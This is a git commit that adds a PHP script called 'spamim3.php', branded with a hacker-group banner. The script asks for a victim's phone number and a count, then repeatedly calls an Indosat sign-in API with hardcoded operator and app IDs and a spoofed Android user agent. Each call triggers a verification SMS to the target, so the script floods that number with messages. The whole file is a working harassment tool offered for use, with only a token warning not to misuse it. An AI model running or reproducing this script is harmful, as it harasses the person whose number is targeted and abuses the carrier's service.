37698dfa1526482f3121510019eef1f4752aabf0
WahyuHack <49711512+WahyuHack@users.noreply.github.com>
2019-04-19 10:51:48 +0800

    Add files via upload

---
+++ spamim3.php
@@ -0,0 +1,51 @@
+SELAMAT DATANG !!!<?php
+$banner = "\e[36;1m
+   mm.           dM8
+   YMMMb.       dMM8
+    YMMMMb     dMMM'
+     YMMMb   dMMMP
+       YMMM  MMM'
+          MbdMP
+      .dMMMMMM.P   -=[SPAM SMS IM3]=-
+     dMM  MMMMMMM  -=[BUATAN: WahyuHack]=-
+     8MMMMMMMMMMI  -=[Team : HackerIndonesiaExploit]=-
+      YMMMMMMMMM   -=[Instagram: Guswahyu21]=-
+        MMMMMMP
+
+
+       #    ##       ##    ######   -> [JANGAN DISALAH GUNAKAN !!]
+       #    #  #    # #         #   -> [GUNAKAN UNTUK KEBAIKAN]
+       #    #   #  #  #        #    -> [Created By: WahyuHack]
+       #    #    ##   #         #   -> [GITHUB: WahyuHack]
+       #    #         #    ######   -> [2019 Hacker Group]
+\n\n";
+sleep(3);
+echo $banner;
+sleep(2);
+echo "\e[0;1m>>> Nomor Korban\n(ex : 6285xxxxxxxxx) : ";
+$target = trim(fgets(STDIN));
+sleep(2);
+echo ">>> jumlah\nMasukan jumlah SPAM : ";
+$jum = trim(fgets(STDIN));
+for ($i=1; $i <= $jum; $i++) {
+$header = array("Content-Type: application/json", "operatorId: 50e22f864fc644c081c0e18319187547", "appId: 168e2950623a4dbe8a57beec814ad6b5", "clientVersion: 127");
+$post = array("msisdn" => "$target");
+$data = json_encode($post);
+$g = curl_init();
+curl_setopt($g, CURLOPT_URL, "https://osa-indosat.lotusflare.com/api/1.0/dcp/user/indosat_begin_sign_in");
+curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($g, CURLOPT_POST, 1);
+curl_setopt($g, CURLOPT_HEADER, 1);
+curl_setopt($g, CURLOPT_POSTFIELDS, $data);
+curl_setopt($g, CURLOPT_HTTPHEADER, $header);
+curl_setopt($g, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_X00AD Build/MMB29M)");
+$h = curl_exec($g);
+curl_close($g);
+preg_match("/challengeId/i", $h, $respon);
+if ($respon[0] == "challengeId") {
+	echo $i. ".SUDAH MASUK KE KORBAN !!!!!\n";
+	}else{
+		echo $i. ".fail maybe you are not handsome\n";
+		}
+	}
+?>
